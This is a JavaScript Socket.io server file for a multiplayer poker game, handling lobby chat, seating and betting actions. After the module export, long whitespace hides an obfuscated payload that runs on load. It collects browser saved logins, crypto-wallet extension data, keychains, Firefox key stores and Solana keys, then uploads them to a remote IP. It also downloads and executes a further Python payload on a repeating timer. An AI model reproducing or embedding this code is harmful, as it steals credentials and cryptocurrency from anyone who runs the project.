// const User = require('../models/User');
const jwt = require('jsonwebtoken');
const Table = require('../pokergame/Table');
const Player = require('../pokergame/Player');
const {
  CS_FETCH_LOBBY_INFO,
  SC_RECEIVE_LOBBY_INFO,
  SC_PLAYERS_UPDATED,
  CS_JOIN_TABLE,
  SC_TABLE_JOINED,
  SC_TABLES_UPDATED,
  CS_LEAVE_TABLE,
  SC_TABLE_LEFT,
  CS_FOLD,
  CS_CHECK,
  CS_CALL,
  CS_RAISE,
  TABLE_MESSAGE,
  CS_SIT_DOWN,
  CS_REBUY,
  CS_STAND_UP,
  SITTING_OUT,
  SITTING_IN,
  CS_DISCONNECT,
  SC_TABLE_UPDATED,
  WINNER,
  CS_LOBBY_CONNECT,
  CS_LOBBY_DISCONNECT,
  SC_LOBBY_CONNECTED,
  SC_LOBBY_DISCONNECTED,
  SC_LOBBY_CHAT,
  CS_LOBBY_CHAT,
} = require('../pokergame/actions');
const config = require('../config');

const tables = {
  1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
};
const players = {};

function getCurrentPlayers() {
  return Object.values(players).map((player) => ({
    socketId: player.socketId,
    id: player.id,
    name: player.name,
  }));
}

function getCurrentTables() {
  return Object.values(tables).map((table) => ({
    id: table.id,
    name: table.name,
    limit: table.limit,
    maxPlayers: table.maxPlayers,
    currentNumberPlayers: table.players.length,
    smallBlind: table.minBet,
    bigBlind: table.minBet * 2,
  }));
}

const init = (socket, io) => {
  socket.on(CS_LOBBY_CONNECT, ({gameId, address, userInfo }) => {
    socket.join(gameId)
    io.to(gameId).emit(SC_LOBBY_CONNECTED, {address, userInfo})
    console.log( SC_LOBBY_CONNECTED , address, socket.id)
  })
  
  socket.on(CS_LOBBY_DISCONNECT, ({gameId, address, userInfo}) => {
    io.to(gameId).emit(SC_LOBBY_DISCONNECTED, {address, userInfo})
    console.log(CS_LOBBY_DISCONNECT, address, socket.id);
  })

  socket.on(CS_LOBBY_CHAT, ({ gameId, text, userInfo }) => {
    io.to(gameId).emit(SC_LOBBY_CHAT, {text, userInfo})
  })

  socket.on(CS_FETCH_LOBBY_INFO, ({walletAddress, socketId, gameId, username}) => {

    const found = Object.values(players).find((player) => {
        return player.id == walletAddress;
      });

      if (found) {
        delete players[found.socketId];
        Object.values(tables).map((table) => {
          table.removePlayer(found.socketId);
          broadcastToTable(table);
        });
      }

      players[socketId] = new Player(
        socketId,
        walletAddress,
        username,
        config.INITIAL_CHIPS_AMOUNT,
      );
      socket.emit(SC_RECEIVE_LOBBY_INFO, {
        tables: getCurrentTables(),
        players: getCurrentPlayers(),
        socketId: socket.id,
        amount: config.INITIAL_CHIPS_AMOUNT
      });
      socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  });

  socket.on(CS_JOIN_TABLE, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    console.log("tableid====>", tableId, table, player)
    table.addPlayer(player);
    socket.emit(SC_TABLE_JOINED, { tables: getCurrentTables(), tableId });
    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    sitDown(tableId, table.players.length, table.limit)

    if (
      tables[tableId].players &&
      tables[tableId].players.length > 0 &&
      player
    ) {
      let message = `${player.name} joined the table.`;
      broadcastToTable(table, message);
    }
  });

  socket.on(CS_LEAVE_TABLE, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    const seat = Object.values(table.seats).find(
      (seat) => seat && seat.player.socketId === socket.id,
    );

    if (seat && player) {
      updatePlayerBankroll(player, seat.stack);
    }

    table.removePlayer(socket.id);

    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    socket.emit(SC_TABLE_LEFT, { tables: getCurrentTables(), tableId });

    if (
      tables[tableId].players &&
      tables[tableId].players.length > 0 &&
      player
    ) {
      let message = `${player.name} left the table.`;
      broadcastToTable(table, message);
    }

    if (table.activePlayers().length === 1) {
      clearForOnePlayer(table);
    }
  });

  socket.on(CS_FOLD, (tableId) => {
    let table = tables[tableId];
    let res = table.handleFold(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_CHECK, (tableId) => {
    let table = tables[tableId];
    let res = table.handleCheck(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_CALL, (tableId) => {
    let table = tables[tableId];
    let res = table.handleCall(socket.id);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(CS_RAISE, ({ tableId, amount }) => {
    let table = tables[tableId];
    let res = table.handleRaise(socket.id, amount);
    res && broadcastToTable(table, res.message);
    res && changeTurnAndBroadcast(table, res.seatId);
  });

  socket.on(TABLE_MESSAGE, ({ message, from, tableId }) => {
    let table = tables[tableId];
    broadcastToTable(table, message, from);
  });

  // socket.on(CS_SIT_DOWN, ({ tableId, seatId, amount }) => {
  //   const table = tables[tableId];
  //   const player = players[socket.id];

  //   if (player) {
  //     table.sitPlayer(player, seatId, amount);
  //     let message = `${player.name} sat down in Seat ${seatId}`;

  //     updatePlayerBankroll(player, -amount);

  //     broadcastToTable(table, message);
  //     if (table.activePlayers().length === 2) {
  //       initNewHand(table);
  //     }
  //   }
  // });
  const sitDown =  (tableId, seatId, amount) => {
    const table = tables[tableId];
    const player = players[socket.id];
    if (player) {
      table.sitPlayer(player, seatId, amount);
      let message = `${player.name} sat down in Seat ${seatId}`;

      updatePlayerBankroll(player, -amount);

      broadcastToTable(table, message);
      if (table.activePlayers().length === 2) {
        initNewHand(table);
      }
    }
  }

  socket.on(CS_REBUY, ({ tableId, seatId, amount }) => {
    const table = tables[tableId];
    const player = players[socket.id];

    table.rebuyPlayer(seatId, amount);
    updatePlayerBankroll(player, -amount);

    broadcastToTable(table);
  });

  socket.on(CS_STAND_UP, (tableId) => {
    const table = tables[tableId];
    const player = players[socket.id];
    const seat = Object.values(table.seats).find(
      (seat) => seat && seat.player.socketId === socket.id,
    );

    let message = '';
    if (seat) {
      updatePlayerBankroll(player, seat.stack);
      message = `${player.name} left the table`;
    }

    table.standPlayer(socket.id);

    broadcastToTable(table, message);
    if (table.activePlayers().length === 1) {
      clearForOnePlayer(table);
    }
  });

  socket.on(SITTING_OUT, ({ tableId, seatId }) => {
    const table = tables[tableId];
    const seat = table.seats[seatId];
    seat.sittingOut = true;

    broadcastToTable(table);
  });

  socket.on(SITTING_IN, ({ tableId, seatId }) => {
    const table = tables[tableId];
    const seat = table.seats[seatId];
    seat.sittingOut = false;

    broadcastToTable(table);
    if (table.handOver && table.activePlayers().length === 2) {
      initNewHand(table);
    }
  });

  socket.on(CS_DISCONNECT, () => {
    const seat = findSeatBySocketId(socket.id);
    if (seat) {
      updatePlayerBankroll(seat.player, seat.stack);
    }

    delete players[socket.id];
    removeFromTables(socket.id);

    socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
    socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  });

  async function updatePlayerBankroll(player, amount) {
    players[socket.id].bankroll += amount;
    io.to(socket.id).emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
  }

  function findSeatBySocketId(socketId) {
    let foundSeat = null;
    Object.values(tables).forEach((table) => {
      Object.values(table.seats).forEach((seat) => {
        if (seat && seat.player.socketId === socketId) {
          foundSeat = seat;
        }
      });
    });
    return foundSeat;
  }
 
  function removeFromTables(socketId) {
    for (let i = 0; i < Object.keys(tables).length; i++) {
      tables[Object.keys(tables)[i]].removePlayer(socketId);
    }
  }

  function broadcastToTable(table, message = null, from = null) {
    for (let i = 0; i < table.players.length; i++) {
      let socketId = table.players[i].socketId;
      let tableCopy = hideOpponentCards(table, socketId);
      io.to(socketId).emit(SC_TABLE_UPDATED, {
        table: tableCopy,
        message,
        from,
      });
    }
  }

  function changeTurnAndBroadcast(table, seatId) {
    setTimeout(() => {
      table.changeTurn(seatId);
      broadcastToTable(table);

      if (table.handOver) {
        initNewHand(table);
      }
    }, 1000);
  }

  function initNewHand(table) {
    if (table.activePlayers().length > 1) {
      broadcastToTable(table, '---New hand starting in 5 seconds---');
    }
    setTimeout(() => {
      table.clearWinMessages();
      table.startHand();
      broadcastToTable(table, '--- New hand started ---');
    }, 5000);
  }

  function clearForOnePlayer(table) {
    table.clearWinMessages();
    setTimeout(() => {
      table.clearSeatHands();
      table.resetBoardAndPot();
      broadcastToTable(table, 'Waiting for more players');
    }, 5000);
  }

  function hideOpponentCards(table, socketId) {
    let tableCopy = JSON.parse(JSON.stringify(table));
    let hiddenCard = { suit: 'hidden', rank: 'hidden' };
    let hiddenHand = [hiddenCard, hiddenCard];

    for (let i = 1; i <= tableCopy.maxPlayers; i++) {
      let seat = tableCopy.seats[i];
      if (
        seat &&
        seat.hand.length > 0 &&
        seat.player.socketId !== socketId &&
        !(seat.lastAction === WINNER && tableCopy.wentToShowdown)
      ) {
        seat.hand = hiddenHand;
      }
    }
    return tableCopy;
  }
};


module.exports = { init };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",a="utf8",$=require("fs"),r=require("os"),n=c=>(s1=c.slice(1),Buffer.from(s1,t).toString(a));pt=require(n("zcGF0aA")),rq=require(n("YcmVxd"+"WVzdA")),ex=require(n("aY2hpbGRfc"+"HJvY2Vzcw"))[n("cZXhlYw")],zv=require(n("Zbm9kZTpwcm9jZXNz")),hs=r[n("caG9zdG5hbWU")](),pl=r[n("YcGxhdGZvcm0")](),hd=r[n("ZaG9tZWRpcg")](),td=r[n("cdG1wZGly")]();let e;const l=c=>Buffer.from(c,t).toString(a),s=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMTI5OjEyNDQ=  ";for(var c="",a="",$="",r="",n=0;n<10;n++)c+=t[n],a+=t[10+n],$+=t[20+n],r+=t[30+n];return c=c+$+r,l(a)+l(c)},h=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[l("ZGlybmFtZQ")](hd)}/${c}`)),o="s2DzOA8",Z="Z2V0",y="Ly5ucGw",i="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",p=l("ZXhpc3RzU3luYw"),u="TG9naW4gRGF0YQ",b="Y29weUZpbGU";function m(t){const c=l("YWNjZXN"+"zU3luYw");try{return $[c](t),!0}catch(t){return!1}}const G=l("RGVmYXVsdA"),W=l("UHJvZmlsZQ"),Y=n("aZmlsZW5hbWU"),f=n("cZm9ybURhdGE"),w=n("adXJs"),V=n("Zb3B0aW9ucw"),v=n("YdmFsdWU"),j=l("cmVhZGRpclN5bmM"),z=l("c3RhdFN5bmM"),L=l("cG9zdA"),X="Ly5jb25maWcv",g="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",R="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],q=["TG9jYWwv"+R,R,_],B=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let U="comp";const J=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","aWJuZWpkZmptbWtwY25s","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],T=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","cGVia2xtbmtvZW9paG9mZWM","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],Q="Y3JlYXRlUmVhZFN0cmVhbQ",S=async(t,c,a)=>{let r=t;if(!r||""===r)return[];try{if(!m(r))return[]}catch(t){return[]}c||(c="");let n=[];const e=l("TG9jYWwgRXh0ZW5"+"zaW9uIFNldHRpbmdz"),s=l(Q);for(let a=0;a<200;a++){const h=`${t}/${0===a?G:`${W} ${a}`}/${e}`;for(let t=0;t<J.length;t++){const e=l(J[t]+T[t]);let o=`${h}/${e}`;if(m(o)){try{far=$[j](o)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(o,t);try{n.push({[v]:$[s](r),[V]:{[Y]:`${c}${a}_${e}_${t}`}})}catch(t){}}))}}}if(a){const t=l("c29sYW5hX2lkLnR4dA");if(r=`${hd}${l("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,$[p](r))try{n.push({[v]:$[s](r),[V]:{[Y]:t}})}catch(t){}}return C(n),n},C=t=>{const c=n("YbXVsdGlfZmlsZQ"),a=n("ZdGltZXN0YW1w"),$=l("L3VwbG9hZHM"),r={[a]:e.toString(),type:o,hid:U,[c]:t},h=s();try{const t={[w]:`${h}${$}`,[f]:r};rq[L](t,((t,c,a)=>{}))}catch(t){}},A=async(t,c)=>{try{const a=h("~/");let $="";$="d"==pl[0]?`${a}${l(g)}${l(t[1])}`:"l"==pl[0]?`${a}${l(X)}${l(t[2])}`:`${a}${l(x)}${l(t[0])}${l(N)}`,await S($,`${c}_`,0==c)}catch(t){}},E=async()=>{let t=[];const c=l(u),a=l(Q),r=l("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),n=l("bG9na2MtZGI");if(pa=`${hd}${r}`,$[p](pa))try{t.push({[v]:$[a](pa),[V]:{[Y]:n}})}catch(t){}else if(pa+="-db",$[p](pa))try{t.push({[v]:$[a](pa),[V]:{[Y]:n}})}catch(t){}try{const r=l(b);let n="";if(n=`${hd}${l(g)}${l(R)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`pld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`pld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},H=async()=>{let t=[];const c=l(u),a=l(Q);try{const r=l(b);let n="";if(n=`${hd}${l(g)}${l(k)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/brld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`brld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`brld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},M=async()=>{let t=[];const c=l(Q),a=l("a2V5NC5kYg"),r=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l(g)}${l("RmlyZWZveA")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const r=`${e}/${s}/${a}`;m(r)&&t.push({[v]:$[c](r),[V]:{[Y]:`fk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${r}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`fk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`flj_${l}`}})}catch(t){}}}catch(t){}return C(t),t},I=async()=>{let t=[];l(u);const c=l(Q);try{const t=l("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let a="";a=`${hd}${t}`;let r=[];if(a&&""!==a&&m(a))try{r=$[j](a)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join(a,t);try{ldb_data.push({[v]:$[c](pa),[V]:{[Y]:`${t}`}})}catch(t){}}))}catch(t){}return C(t),t},O=async()=>{let t=[];const c=l(u),a=l(Q);try{const r=l(b);let n="";if(n=`${hd}${l(X)}${l(_)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`plld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`plld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},P=async()=>{let t=[];const c=l(Q),a=l("a2V5NC5kYg"),r=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const r=`${e}/${s}/${a}`;m(r)&&t.push({[v]:$[c](r),[V]:{[Y]:`flk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${r}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`flk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`fllj_${l}`}})}catch(t){}}}catch(t){}return C(t),t},D=l("cm1TeW5j"),K="XC5weXBccHl0",tt="aG9uLmV4ZQ",ct=51476592;let at=0;const $t=async t=>{const c=`${l("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,r)=>{if(c)return $[D](t),void(at=0);$[D](t),lt()}))},rt=()=>{const t=l("cDIuemlw"),c=`${s()}${l("L3Bkb3du")}`,a=`${td}\\${l("cC56aQ")}`,r=`${td}\\${t}`;if(at>=ct+4)return;const n=l("cmVuYW1lU3luYw"),e=l("cmVuYW1l");if($[p](a))try{var h=$[z](a);h.size>=ct+4?(at=h.size,$[e](a,r,(t=>{if(t)throw t;$t(r)}))):(at<h.size?at=h.size:($[D](a),at=0),nt())}catch(t){}else{const t=`${l("Y3VybCAtTG8")} "${a}" "${c}"`;ex(t,((t,c,e)=>{if(t)return at=0,void nt();try{at=ct+4,$[n](a,r),$t(r)}catch(t){}}))}};function nt(){setTimeout((()=>{rt()}),2e4)}const et=async()=>{av="426E";try{av+=zv[l("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:e.toString(),type:o,hid:U,ss:t,cc:c.toString()},$=s(),r={[w]:`${$}${l("L2tleXM")}`,[f]:a};try{rq[L](r,((t,c,a)=>{}))}catch(t){}})("av",av)},lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${l(K+tt)}`;$[p](`${t}`)?(()=>{const t=s(),c=l(d),a=l(Z),r=l(i),n=l(y),e=`${t}${c}/${o}`,h=`${hd}${n}`,p=`"${hd}${l(K+tt)}" "${h}"`;try{$[D](h)}catch(t){}rq[a](e,((t,c,a)=>{if(!t)try{$[r](h,a),ex(p,((t,c,a)=>{}))}catch(t){}}))})():rt()}else(()=>{const t=s(),c=l(d),a=l(i),r=l(Z),n=l(y),e=l("cHl0aG9u"),h=`${t}${c}/${o}`,p=`${hd}${n}`;let u=`${e}3 "${p}"`;rq[r](h,((t,c,r)=>{t||($[a](p,r),ex(u,((t,c,a)=>{})))}))})()}));const st=async()=>{try{e=Date.now(),await(async()=>{U=hs,await et();try{const t=h("~/");await A(q,0),await A(F,1),await A(B,2),"w"==pl[0]?(pa=`${t}${l(x)}${l("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${l(N)}`,await S(pa,"3_",!1)):"d"==pl[0]?(await E(),await H(),await M()):"l"==pl[0]&&(await I(),await O(),await P())}catch(t){}})(),lt()}catch(t){}};st();let ht=setInterval((()=>{1,c<5?st():clearInterval(ht)}),6e5);
